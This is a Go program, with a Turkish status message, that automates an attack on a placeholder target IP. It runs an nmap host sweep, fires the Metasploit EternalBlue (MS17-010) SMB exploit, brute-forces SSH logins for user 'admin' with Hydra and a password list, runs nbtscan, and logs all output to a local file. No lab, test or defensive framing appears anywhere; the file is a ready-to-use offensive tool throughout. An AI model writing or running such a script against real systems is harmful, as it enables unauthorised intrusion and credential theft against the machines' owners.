package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
)

func main() {
	targetIP := "<TARGET_IP>"

	// Nmap Scanning
	nmapCommand := exec.Command("nmap", "-sn", targetIP)
	nmapOutput, err := nmapCommand.CombinedOutput()
	if err != nil {
		log.Fatal(err)
	}
	saveOutput("Nmap Scan", nmapOutput)

	// ms17-010 Attack with Metasploit Framework
	msfCommand := exec.Command("msfconsole", "-x", fmt.Sprintf("use exploit/windows/smb/ms17_010_eternalblue;set RHOSTS %s;exploit", targetIP))
	msfOutput, err := msfCommand.CombinedOutput()
	if err != nil {
		log.Fatal(err)
	}
	saveOutput("EternalBlue Exploit", msfOutput)

	// SSH brute-force Attack
	hydraCommand := exec.Command("hydra", "-l", "admin", "-P", "passwords.txt", fmt.Sprintf("ssh://%s", targetIP))
	hydraOutput, err := hydraCommand.CombinedOutput()
	if err != nil {
		log.Fatal(err)
	}
	saveOutput("SSH BruteForce", hydraOutput)

	// nbtscan Scanning
	nbtscanCommand := exec.Command("nbtscan", targetIP)
	nbtscanOutput, err := nbtscanCommand.CombinedOutput()
	if err != nil {
		log.Fatal(err)
	}
	saveOutput("nbtscan", nbtscanOutput)

	fmt.Println("Taramalar tamamlandı.")
}

func saveOutput(scanType string, output []byte) {
	filename := "otobot.txt"
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	file.WriteString(fmt.Sprintf("---- %s ----\n", scanType))
	file.Write(output)
	file.WriteString("\n\n")
}
